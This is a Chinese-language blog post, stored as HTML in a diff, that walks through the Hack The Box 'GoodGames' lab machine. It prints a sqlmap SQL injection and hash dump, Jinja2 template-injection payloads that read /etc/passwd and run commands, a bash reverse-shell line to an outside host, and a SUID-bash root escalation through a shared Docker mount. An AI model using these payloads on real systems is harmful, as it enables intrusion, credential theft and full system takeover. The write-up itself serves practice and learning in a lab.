@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"dawoxiansigema.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="GoodGames is an Easy linux machine that showcases the importance of sanitising user inputs in web applications to prevent SQL injection attacks, using strong hashing algorithms in database structures">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GoodGames">
+<meta property="og:url" content="http://dawoxiansigema.github.io/2025/09/04/GoodGames/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="GoodGames is an Easy linux machine that showcases the importance of sanitising user inputs in web applications to prevent SQL injection attacks, using strong hashing algorithms in database structures">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/09/04/GoodGames/1.png">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/09/04/GoodGames/2.PNG">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/09/04/GoodGames/3.PNG">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/09/04/GoodGames/4.PNG">
+<meta property="article:published_time" content="2025-09-04T08:15:58.000Z">
+<meta property="article:modified_time" content="2025-09-22T13:27:24.818Z">
+<meta property="article:author" content="Xu Haoxiang">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://dawoxiansigema.github.io/2025/09/04/GoodGames/1.png">
+
+
+<link rel="canonical" href="http://dawoxiansigema.github.io/2025/09/04/GoodGames/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://dawoxiansigema.github.io/2025/09/04/GoodGames/","path":"2025/09/04/GoodGames/","title":"GoodGames"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>GoodGames | Hexo</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hexo</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Recon"><span class="nav-number">1.</span> <span class="nav-text">Recon</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-augusts"><span class="nav-number">2.</span> <span class="nav-text">Shell as augusts</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLMAP"><span class="nav-number">2.1.</span> <span class="nav-text">SQLMAP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSTI"><span class="nav-number">2.2.</span> <span class="nav-text">SSTI</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Docker%E9%80%83%E9%80%B8"><span class="nav-number">2.3.</span> <span class="nav-text">Docker逃逸</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-root"><span class="nav-number">3.</span> <span class="nav-text">Shell as root</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Xu Haoxiang</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://dawoxiansigema.github.io/2025/09/04/GoodGames/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Xu Haoxiang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="GoodGames | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          GoodGames
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-09-04 16:15:58" itemprop="dateCreated datePublished" datetime="2025-09-04T16:15:58+08:00">2025-09-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-09-22 21:27:24" itemprop="dateModified" datetime="2025-09-22T21:27:24+08:00">2025-09-22</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>GoodGames is an Easy linux machine that showcases the importance of sanitising user inputs in web applications to prevent SQL injection attacks, using strong hashing algorithms in database structures to prevent the extraction and cracking of passwords from a compromised database, along with the dangers of password re-use. It also highlights the dangers of using <code>render_template_string</code> in a Python web application where user input is reflected, allowing Server Side Template Injection (SSTI) attacks. Privilege escalation involves docker hosts enumeration and shows how having admin privileges in a container and a low privilege user on the host machine can be dangerous, allowing attackers to escalate privileges to compromise the system.</p>
+<span id="more"></span>
+
+<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><p>初步嗅探发现就开了个80端口 可以正常访问 在初步试探的时候没有发现突出的东西 于是顺便扫了一下详细信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.98 ( https://nmap.org ) at 2025-09-04 16:25 +0800</span><br><span class="line">Nmap scan report for internal-administration.goodgames.htb (10.10.11.130)</span><br><span class="line">Host is up (0.00s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.9.2)</span><br></pre></td></tr></table></figure>
+
+<p>查了一下这个框架也没啥收获 尝试扫一下目录也没有收获</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains ffuf -w &#x27;/home/kali/Desktop/PasswordDic/目录扫描字典/admin.txt&#x27; -u http://10.10.11.130</span><br></pre></td></tr></table></figure>
+
+<p>那就老老实实走一下业务流程好了 在用户注册的时候 发现前端对用户邮箱这块有明显的过滤 而且就单单是邮箱这个地方加了过滤</p>
+<p><img src="/2025/09/04/GoodGames/1.png"></p>
+<p><strong>渗透的思路确实重要 越可能是关键脆弱的地方 开发者越是会添加限制</strong> 直觉告诉我可能会有sql注入 但是一般在登陆点 所以注册就随便注册一个 不出意外登陆的时候也有邮箱输入过滤 于是我们用burp+sqlmap</p>
+<h1 id="Shell-as-augusts"><a href="#Shell-as-augusts" class="headerlink" title="Shell as augusts"></a>Shell as augusts</h1><h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /login HTTP/1.1</span><br><span class="line">Host: 10.10.11.130</span><br><span class="line">Content-Length: 39</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://10.10.11.130</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://10.10.11.130/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">email=&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<p>将上述请求包存为文件 而后着手sqlmap</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">❯ sqlmap -r request -dbs --batch</span><br><span class="line">[proxychains] config file found: /Users/joe/proxychains-ng/proxychains.conf</span><br><span class="line">[proxychains] preloading /Users/joe/proxychains-ng/libproxychains4.dylib</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17-git-4-gce07eaa</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[&quot;]_____ ___ ___  &#123;1.9.9.1#dev&#125;</span><br><span class="line">|_ -| . [(]     | .&#x27;| . |</span><br><span class="line">|___|_  [)]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   https://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 16:54:33 /2025-09-04/</span><br><span class="line"></span><br><span class="line">[16:54:33] [INFO] parsing HTTP request from &#x27;request&#x27;</span><br><span class="line">[16:54:33] [WARNING] provided value for parameter &#x27;email&#x27; is empty. Please, always use only valid parameter values so sqlmap could be able to run properly</span><br><span class="line">[16:54:33] [WARNING] provided value for parameter &#x27;password&#x27; is empty. Please, always use only valid parameter values so sqlmap could be able to run properly</span><br><span class="line">[16:54:33] [INFO] resuming back-end DBMS &#x27;mysql&#x27;</span><br><span class="line">[16:54:33] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: email (POST)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: email=&#x27; AND (SELECT 4855 FROM (SELECT(SLEEP(5)))LHIO) AND &#x27;FmPO&#x27;=&#x27;FmPO&amp;password=</span><br><span class="line">---</span><br><span class="line">[16:54:34] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[16:54:34] [INFO] fetching database names</span><br><span class="line">[16:54:34] [INFO] fetching number of databases</span><br><span class="line">[16:54:34] [INFO] resumed: 2</span><br><span class="line">[16:54:34] [INFO] resumed: information_schema</span><br><span class="line">[16:54:34] [INFO] resumed: main</span><br><span class="line">available databases [2]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] main</span><br></pre></td></tr></table></figure>
+
+<p>然后就是最喜欢的dumpall了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">❯ sqlmap -r request --dump -D main -T user</span><br><span class="line"></span><br><span class="line">+----+---------------------+--------+----------------------------------+</span><br><span class="line">| id | email               | name   | password                         |</span><br><span class="line">+----+---------------------+--------+----------------------------------+</span><br><span class="line">| 1  | admin@goodgames.htb | admin  | 2b22337f218b2d82dfc3b6f77e7cb8ec |</span><br><span class="line">+----+---------------------+--------+----------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>拿去hash爆破一下不难得出用户名密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2b22337f218b2d82dfc3b6f77e7cb8ec	md5	superadministrator</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/04/GoodGames/2.PNG"></p>
+<p>发现右上角多了一个小小的设置按钮 直接访问打不开 后来想起来之前用pwnbox的时候 加个host就可以打开了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.130  internal-administration.goodgames.htb</span><br></pre></td></tr></table></figure>
+
+<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p><img src="/2025/09/04/GoodGames/3.PNG"></p>
+<p>使用admin&#x2F;superadministrator登陆 最开始用邮箱登录不进去的时候快自闭了 当然也看到了这个框架叫Flask Volt DashBoard 那不得试一下有没有SSTI</p>
+<p><img src="/2025/09/04/GoodGames/4.PNG"></p>
+<p>很好 名字那块成功回显为4 那么抓包慢慢注 先试试看能不能抓到&#x2F;etc&#x2F;passwd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2---basic-injection</span><br><span class="line"></span><br><span class="line">&#123;&#123; get_flashed_messages.__globals__.__builtins__.open(&quot;/etc/passwd&quot;).read() &#125;&#125;</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>大概在370行回显成功获取&#x2F;etc&#x2F;passwd 那么弹个shell吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; namespace.__init__.__globals__.os.popen(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.*.*/443 0&gt;&amp;1&quot;&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>试了很久shell都连不上 但是各种命令都是正常的 蒜鸟凑合着用吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[217](&#x27;cat /home/augustus/user.txt&#x27;,shell=True,stdout=-1).communicate()&#125;&#125;</span><br><span class="line"></span><br><span class="line"> (b&#x27;edc966df55df36ad53d95801236cf3d0\n&#x27;, None)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Docker逃逸"><a href="#Docker逃逸" class="headerlink" title="Docker逃逸"></a>Docker逃逸</h2><p>当然我在最初ls的时候 发现了有Dockerfile的存在 说明我们在Docker容器里面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        </span><br><span class="line">inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255\n        </span><br><span class="line">ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)\n        </span><br><span class="line">RX packets 819  bytes 150080 (146.5 KiB)\n        </span><br><span class="line">RX errors 0  dropped 0  overruns 0  frame 0\n        </span><br><span class="line">TX packets 673  bytes 584411 (570.7 KiB)\n        </span><br><span class="line">TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\n</span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536\n        </span><br><span class="line">inet 127.0.0.1  netmask 255.0.0.0\n        loop  txqueuelen 1000  (Local Loopback)\n        </span><br><span class="line">RX packets 0  bytes 0 (0.0 B)\n        </span><br><span class="line">RX errors 0  dropped 0  overruns 0  frame 0\n        </span><br><span class="line">TX packets 0  bytes 0 (0.0 B)\n        </span><br><span class="line">TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\n&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>现在无非是如何获取到主机的ip和端口 很想手搓一个nmap出来 更何况我一直连不上reverse shell 只能徒手一条条ping 我日 好在直接在profile那边执行payload后用kali连上了 可能是mac防火墙的问题?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Sq00ky/Bash-Port-Scanner/blob/master/spookyscan.sh</span><br><span class="line"></span><br><span class="line">for i in &#123;1..254&#125;; do (ping -c 1 172.19.0.$&#123;i&#125; | grep &quot;bytes from&quot; | grep -v &quot;Unreachable&quot; &amp;); done;</span><br><span class="line"></span><br><span class="line">for port in &#123;1..65535&#125;; do echo &gt; /dev/tcp/172.19.0.1/$port &amp;&amp; echo &quot;$port open&quot;; done 2&gt;/dev/null </span><br></pre></td></tr></table></figure>
+
+<p>查扫一条龙发现172.19.0.1的ssh是开的 当前登陆用户为root 大概率登陆不上 看下&#x2F;home下的用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@3a453ab39d3d:/home# </span><br><span class="line">ls</span><br><span class="line">augustus</span><br></pre></td></tr></table></figure>
+
+<p>再复用密码 试一下直接ssh 发现是可以连上的!</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">oot@3a453ab39d3d:/backend# ssh augustus@172.19.0.1</span><br><span class="line">The authenticity of host &#x27;172.19.0.1 (172.19.0.1)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added &#x27;172.19.0.1&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">augustus@172.19.0.1&#x27;s password: </span><br><span class="line">Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">augustus@GoodGames:~$ ls</span><br><span class="line">user.txt</span><br></pre></td></tr></table></figure>
+
+<h1 id="Shell-as-root"><a href="#Shell-as-root" class="headerlink" title="Shell as root"></a>Shell as root</h1><p>很奇怪 发现即使出了docker发现这个user.txt以及&#x2F;home&#x2F;augustus文件夹和在docker里的一模一样 不得不说HTB的质量确实高</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@3a453ab39d3d:/home/augustus# touch test</span><br><span class="line"></span><br><span class="line">//切换至宿主机</span><br><span class="line">augustus@GoodGames:~$ ls -al            </span><br><span class="line">total 1232</span><br><span class="line">drwxr-xr-x 2 augustus augustus    4096 Sep  6 03:22 .</span><br><span class="line">drwxr-xr-x 3 root     root        4096 Oct 19  2021 ..</span><br><span class="line">-rwxr-xr-x 1 augustus augustus 1234376 Sep  6 03:22 bash</span><br><span class="line">lrwxrwxrwx 1 root     root           9 Nov  3  2021 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 augustus augustus     220 Oct 19  2021 .bash_logout</span><br><span class="line">-rw-r--r-- 1 augustus augustus    3526 Oct 19  2021 .bashrc</span><br><span class="line">-rw-r--r-- 1 augustus augustus     807 Oct 19  2021 .profile</span><br><span class="line">-rw-r--r-- 1 root     root           0 Sep  6 03:10 test</span><br><span class="line">-rw-r----- 1 root     augustus      33 Sep  5 16:02 user.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我在docker中新建的文件 一模一样的出现在了宿主机中 并且确实是属于docker中的root用户 怪 相当于他把本机挂载成了docker? 既然如此那就将augustus的bash复制到docker里面 再进行SUID组合拳</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//此时的bash还不具备rws权限</span><br><span class="line">augustus@GoodGames:~$ cp /bin/bash .</span><br><span class="line">augustus@GoodGames:~$ ls -la bash</span><br><span class="line">-rwxr-xr-x 1 augustus augustus 1234376 Sep  6 03:22 bash</span><br><span class="line"></span><br><span class="line">root@3a453ab39d3d:~# chown root:root /home/augustus/bash //修改归属为root</span><br><span class="line">root@3a453ab39d3d:~# chmod 4777 /home/augustus/bash //4777赋予SUID权限</span><br><span class="line">root@3a453ab39d3d:~# cd /home/augustus/</span><br><span class="line">root@3a453ab39d3d:/home/augustus# ls -al bash </span><br><span class="line">-rwsrwxrwx 1 root root 1234376 Sep  6 02:22 bash //此时bash已具备SUID权限</span><br><span class="line"></span><br><span class="line">augustus@GoodGames:~$ ./bash -p</span><br><span class="line">bash-5.1# cat /root/root.txt </span><br><span class="line">9e6c801a78a34c84067aabeef3737c03</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/HTB/" rel="tag"># HTB</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/09/06/SUID/" rel="next" title="SUID">
+                  SUID <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Xu Haoxiang</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
